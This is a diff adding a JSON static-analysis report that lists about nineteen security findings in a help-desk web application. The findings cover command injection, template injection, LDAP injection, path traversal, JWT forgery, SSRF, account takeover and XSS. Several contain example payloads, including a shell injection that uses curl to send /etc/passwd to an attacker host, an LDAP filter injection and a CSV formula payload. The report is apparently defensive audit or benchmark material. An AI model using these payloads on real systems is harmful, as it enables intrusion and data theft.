@@ -1,0 +1,481 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc-export",
+      "path": "backend/src/import-export/import-export.service.ts",
+      "start": {
+        "line": 563,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 566,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertTicketBundleToFormat() builds a shell command string `pandoc ${sourcePath} -o ${outputPath}` where outputPath embeds the caller-supplied `exportFormat` query parameter (from GET /import-export/export/tickets/:ticketId/rendered?exportFormat=) and executes it via spawn('bash', ['-c', cmd], { shell: true }) with no allowlist validation. A value like `pdf; curl attacker.com/$(cat /etc/passwd)` injects arbitrary OS commands. The sibling method convertEscalationBundleToFormat (line 594) validates exportFormat against ALLOWED_ESCALATION_REPORT_FORMATS and uses spawn('pandoc', [...], { shell: false }) safely, confirming this is a real gap.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssti-handlebars",
+      "path": "backend/src/knowledge-base/knowledge-base.service.ts",
+      "start": {
+        "line": 375,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 384,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCategoryDigestIntro() calls Handlebars.compile(introTemplate) directly on a fully attacker-controlled string from POST /knowledge-base/digest-intro-preview, then immediately executes the compiled template. Handlebars templates can reach helper/constructor gadgets for remote code execution (classic SSTI). The sibling method previewArticleFeedbackFooter (line 392) only ever compiles a hardcoded FIXED_FOOTER_TEMPLATE, confirming user-supplied templates should never reach Handlebars.compile directly.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 44,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 45,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findStaffRecordByEmail() builds the LDAP search filter `(mail=${email})` using the raw, unescaped `email` parameter and passes it to directoryClient.search(). Every sibling method in this file (searchStaffDirectory, syncStaffRoleFromDirectory) passes user input through escapeLdapFilterValue() first, but this method does not. An email value like `*)(uid=*))(|(mail=*` injects arbitrary LDAP filter clauses, allowing directory-wide enumeration or filter bypass.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.branding-asset-upload",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 85,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 88,
+        "col": 45,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveBrandingAsset() joins the client-supplied `file.originalname` directly into the destination path (path.join(brandingDir, file.originalname)) and writes it with fs.writeFileSync, with no sanitization of '..' or absolute-path segments. An authenticated support_admin/team_lead uploading a file named e.g. '../../../../etc/cron.d/evil' can write files outside the intended public/branding/{orgId} directory. The sibling saveWorkspaceIconAsset (line 99) safely generates the filename via crypto.randomUUID() instead of trusting client input.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.report-template-read",
+      "path": "backend/src/reports/reports.service.ts",
+      "start": {
+        "line": 36,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 38,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderCategoryReport() builds templatePath = path.join(this.templatesDir, `${category}.txt`) from ticket.category and reads it with fs.readFileSync, with no path-containment check. ticket.category is a free-form string (only @IsString()/@MaxLength(100) validated) settable by an unprivileged customer_user via POST /tickets. A category value containing '../' traversal sequences lets a low-privilege customer read files outside templatesDir via GET /reports/ticket/:ticketId/category-summary. The sibling renderQueueReport (line 61-67) correctly guards against this with path.resolve() + startsWith() containment check, confirming this omission is a real gap.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-membership-tier-param",
+      "path": "backend/src/escalations/escalations.service.ts",
+      "start": {
+        "line": 313,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 317,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findById() accepts a fully client-supplied `membershipTier` query parameter (escalations.controller.ts line 115, passed through with no server-side verification of the caller's actual membership). If it equals 'partner_reviewer', the method returns the full escalation record \u2014 including cross-organization ticket, requester, and assignee PII \u2014 and skips the organization-ownership check entirely. Any authenticated user, including a customer_user, can call GET /escalations/:id?membershipTier=partner_reviewer to read any organization's escalation data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.jwt-alg-none-and-unverified-fallback",
+      "path": "backend/src/escalations/escalations.service.ts",
+      "start": {
+        "line": 382,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 392,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "admitPartnerHandoff() calls jwt.verify(handoffToken, secret, { algorithms: ['HS256', 'none'] }), permitting the classic JWT alg:none forgery where an attacker-crafted unsigned token with arbitrary claims (e.g. reviewerEmail, accessLevel) is accepted as valid. Additionally, if verify() throws for any reason, the code falls back to jwt.decode(handoffToken), which performs no signature verification at all, completely defeating the purpose of signing the handoff context.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-partner-sync",
+      "path": "backend/src/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 143,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 168,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "receivePartnerSync() base64-decodes and JSON.parse's a fully attacker-supplied URL path segment (POST /webhooks/partner-sync/:payload), maps it via plainToClass(PartnerTicketPatch, parsed) with no whitelist/validate() call, then spreads the result directly into prisma.ticket.update({ data: fields as any }). PartnerTicketPatch declares assigneeId and organizationId as settable fields, so any staff user merely assigned to (or on the team of) a ticket can overwrite arbitrary ticket columns such as organizationId, assigneeId, and status beyond the intended sync scope.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.webhook-relay-fetch",
+      "path": "backend/src/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 122,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 136,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "relayToPartnerEndpoint() performs fetch(`${webhook.url}?event=...&delivery_key=${deliveryKey}`) with no validation that webhook.url (set via CreateWebhookDto, which only checks @IsUrl() with no private-IP/hostname denylist) doesn't point at internal/link-local addresses such as http://169.254.169.254/. The PARTNER_DELIVERY_KEY secret is appended directly in the URL, so an SSRF to an attacker-controlled host also leaks that secret.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.weak-password-recovery-token-leak",
+      "path": "backend/src/auth/auth.service.ts",
+      "start": {
+        "line": 179,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 205,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "forgotPassword() generates a password-reset token and returns it directly in the API response body (`resetToken: token`) instead of only emailing it to the account owner. Since resetPassword() (line 208) accepts any valid token without re-verifying the requester's identity, any caller who merely knows a victim's email address can call POST /auth/forgot-password, receive the reset token directly in the HTTP response, then immediately call POST /auth/reset-password to take over the account \u2014 no access to the victim's inbox is ever required.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.hardcoded-jwt-secret-fallback",
+      "path": "backend/src/auth/jwt.strategy.ts",
+      "start": {
+        "line": 26,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 100,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The JWT strategy falls back to the hardcoded string 'change-me-in-production-use-a-real-secret-key' whenever the JWT_SECRET environment variable is not set (same fallback duplicated in auth.module.ts line 18). If any deployment omits JWT_SECRET, an attacker who knows this publicly-visible source code can forge validly-signed JWTs for any user ID and role, achieving full authentication bypass and privilege escalation.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.hardcoded-portal-session-secret-fallback",
+      "path": "backend/src/portal/portal.service.ts",
+      "start": {
+        "line": 57,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "checkIntoTicketPortal() signs the customer portal session JWT with process.env.PORTAL_SESSION_SECRET || 'portal-dev-secret'. If the env var is unset in any deployment, the well-known fallback string is used to sign tokens, allowing anyone to forge a valid portalToken granting access to any customer's ticket portal session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.client-controlled-bcrypt-cost-factor",
+      "path": "backend/src/auth/auth.service.ts",
+      "start": {
+        "line": 338,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 339,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "initializeAccount() uses `const rounds = dto.provisioningTier ?? this.saltRounds;` to let the caller of the unauthenticated POST /auth/initialize-account endpoint pick the bcrypt cost factor directly (initialize-account.dto.ts only enforces @IsInt(), no @Min/@Max bound). A caller can set provisioningTier to 1, producing a bcrypt hash trivially crackable offline if the database is ever compromised, undermining password storage security for any account created through this endpoint.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.crlf-content-disposition",
+      "path": "backend/src/import-export/import-export.controller.ts",
+      "start": {
+        "line": 129,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 129,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportTicketsBundle() puts the user-supplied `reportLabel` query parameter directly into res.setHeader('Content-Disposition', `attachment; filename=\"${label}.csv\"`) with no sanitization of CR/LF characters. The sibling escalations export endpoint (line 151, using `sanitizedLabel`) strips control characters before use, confirming this omission is a real gap that can allow HTTP response header injection/splitting via a crafted reportLabel value.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.csv-injection.formula-injection-export",
+      "path": "backend/src/import-export/import-export.service.ts",
+      "start": {
+        "line": 263,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 286,
+        "col": 45,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportTickets() writes user-controlled fields (ticket subject, requester/assignee names) straight into CSV output via stringify(records, { header: true }) with no escaping of leading '=', '+', '-', or '@' characters. A ticket subject such as `=cmd|'/c calc'!A1` opened in Excel by a support admin triggers formula/DDE execution (CSV injection). The same unescaped pattern repeats in exportEscalations() and exportSlaPerformance() in the same file.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1236: Improper Neutralization of Formula Elements in a CSV File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.file-upload.unrestricted-upload-no-limits",
+      "path": "backend/src/attachments/attachments.module.ts",
+      "start": {
+        "line": 1,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 9,
+        "col": 30,
+        "offset": 0
+      },
+      "extra": {
+        "message": "AttachmentsModule registers FileInterceptor('file') with no MulterModule size limit and attachments.service.ts upload() (line 47-78) performs no file extension, MIME-type, or size validation before writing the buffer to disk, unlike ImportExportModule which sets a 10MB MulterModule.register({ limits }). This allows unbounded-size uploads to be buffered fully into memory (memory-exhaustion DoS) and permits storage of arbitrary file types with an attacker-controlled mimeType value that is later trusted verbatim as the Content-Type on download (attachments.controller.ts line 147).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type",
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-disclosure.header-gated-stack-trace",
+      "path": "backend/src/sla/sla.service.ts",
+      "start": {
+        "line": 178,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 184,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getCapacityForecast() returns raw err.message and err.stack (plus the caller's query parameters) whenever the client-supplied HTTP header `x-ops-context: internal-ops` is present (sla.controller.ts line 78). Because this 'internal' gate is just an attacker-settable request header rather than genuine service-to-service authentication, any authenticated support_admin/team_lead caller can trivially request verbose internal error detail and stack traces that could reveal file paths or implementation internals.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xss.innerhtml-ticket-reply-nl2br",
+      "path": "frontend/src/app/ticket/ticket-detail.component.html",
+      "start": {
+        "line": 167,
+        "col": 19,
+        "offset": 0
+      },
+      "end": {
+        "line": 167,
+        "col": 75,
+        "offset": 0
+      },
+      "extra": {
+        "message": "reply.content (free-text ticket reply body, submittable by any authenticated user including low-privilege customers via POST /api/tickets/:id/replies) is piped through Nl2brPipe (frontend/src/app/ticket/nl2br.pipe.ts:7), which only replaces newlines with '<br>' and performs no HTML-entity encoding of '<', '>', '\"', or '&'. The result is bound with [innerHTML], so any HTML a user types into a reply is parsed as markup for every other viewer of that ticket, including support agents and admins.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.xss.innerhtml-kb-article-content",
+      "path": "frontend/src/app/knowledge-base/kb-detail/kb-detail.component.html",
+      "start": {
+        "line": 64,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 64,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "article.content is bound directly via [innerHTML]=\"article.content\" with no pipe, encoding, or DomSanitizer call. content originates from a plain (non-rich-text) reactive form field (kb-editor.component.ts) submitted verbatim to POST /knowledge-base by any support_agent/team_lead/support_admin. Any HTML/script markup typed into that field is stored and rendered raw to every viewer of the article, including other staff and customers viewing the knowledge base.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
